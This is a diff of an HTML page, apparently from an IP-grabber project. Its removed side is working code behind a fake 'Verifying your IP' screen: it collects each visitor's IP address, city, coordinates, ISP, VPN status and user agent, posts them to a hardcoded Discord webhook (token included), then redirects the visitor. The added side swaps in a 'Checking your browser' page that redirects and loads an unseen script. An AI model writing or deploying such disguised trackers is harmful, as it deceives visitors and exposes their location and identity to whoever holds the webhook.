@@ -2,141 +2,14 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Verification</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f1f1f1;
-            text-align: center;
-            padding: 50px;
-        }
-        #verify {
-            background-color: #fff;
-            border: 1px solid #ccc;
-            display: inline-block;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            font-size: 28px;
-            color: #333;
-        }
-        p {
-            font-size: 18px;
-            color: #666;
-        }
-        .loading {
-            font-size: 18px;
-            color: #007bff;
-            font-weight: bold;
-        }
-    </style>
+    <title>Document</title>
+    <!-- Optional: Paste the URL you want to be redirected to MAINPAGE.html => YOUR URL --> <meta http-equiv="refresh" content="3;url=x.html" />
 </head>
 <body>
-    <div id="verify">
-        <h1>Verifying your IP...</h1>
-        <p class="loading">Please wait while we validate your connection...</p>
-    </div>
-
-    <script>
-        // Your Discord Webhook URL (update with your webhook)
-        const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
-        
-        // Redirect URL after verification
-        const redirectURL = "https://www.genned.net/auth/rdtqx";
-
-        async function logVisitor() {
-            try {
-                // Step 1: Get the user's public IP address using ipify API
-                const ipResponse = await fetch("https://api.ipify.org?format=json");
-                if (!ipResponse.ok) {
-                    throw new Error("Failed to fetch IP address");
-                }
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-
-                // Step 2: Use ip-api.com to get geolocation and VPN detection information
-                const locationResponse = await fetch(`http://ip-api.com/json/${userIP}?fields=status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon,timezone,query`);
-                if (!locationResponse.ok) {
-                    throw new Error("Failed to fetch geolocation data");
-                }
-                const locationData = await locationResponse.json();
-
-                if (locationData.status !== "success") {
-                    throw new Error(`Error in location data: ${locationData.message}`);
-                }
-
-                // Step 3: Check VPN/Proxy status
-                const vpnStatus = (locationData.proxy || locationData.hosting) ? '🔴 VPN/Proxy Detected' : '🟢 No VPN/Proxy Detected';
-
-                // Prepare the message for Discord webhook
-                const message = {
-                    content: `**New Visitor Logged**\n\n` +
-                             `**IP Address:** ${locationData.query}\n` +
-                             `**Country:** ${locationData.country}\n` +
-                             `**Region:** ${locationData.regionName}\n` +
-                             `**City:** ${locationData.city}\n` +
-                             `**ISP:** ${locationData.isp}\n` +
-                             `**Organization:** ${locationData.org}\n` +
-                             `**ASN:** ${locationData.as}\n` +
-                             `**Latitude:** ${locationData.lat}\n` +
-                             `**Longitude:** ${locationData.lon}\n` +
-                             `**Timezone:** ${locationData.timezone}\n` +
-                             `**Mobile Device:** ${locationData.mobile ? "Yes" : "No"}\n` +
-                             `**VPN/Proxy:** ${locationData.proxy ? "Yes" : "No"}\n` +
-                             `**Hosting Service:** ${locationData.hosting ? "Yes" : "No"}\n` +
-                             `${vpnStatus}\n\n` +
-                             `**User-Agent:** \`${navigator.userAgent}\``
-                };
-
-                // Step 4: Send data to Discord webhook
-                const discordResponse = await fetch(webhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(message)
-                });
-
-                if (!discordResponse.ok) {
-                    throw new Error("Failed to send data to Discord");
-                }
-
-                // Step 5: After sending data to Discord, redirect
-                window.location.href = redirectURL; // Redirect to the target URL
-
-            } catch (error) {
-                // Send error details to Discord webhook
-                const errorMessage = {
-                    content: `**Error Occurred During IP Verification**\n\n` +
-                             `**Error Message:** ${error.message}\n` +
-                             `**Stack Trace:** \n\`\`\`${error.stack}\`\`\`\n` +
-                             `**User-Agent:** \`${navigator.userAgent}\`\n` +
-                             `**IP:** ${userIP || "Unavailable"}` // Include user IP if possible
-                };
-
-                try {
-                    // Send error information to Discord webhook
-                    await fetch(webhookURL, {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify(errorMessage)
-                    });
-                } catch (discordError) {
-                    console.error("Failed to send error data to Discord:", discordError);
-                }
-
-                // **Redirect** the user on error as well (ensure redirection even on errors)
-                window.location.href = redirectURL;
-            }
-        }
-
-        // Ensure the redirection occurs after the verification process is completed
-        setTimeout(logVisitor, 500); // Delay the execution by 500ms to allow async operations to complete
-    </script>
+    <h1>Checking your browser...</h1>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="index.js"></script>
 </body>
 </html>
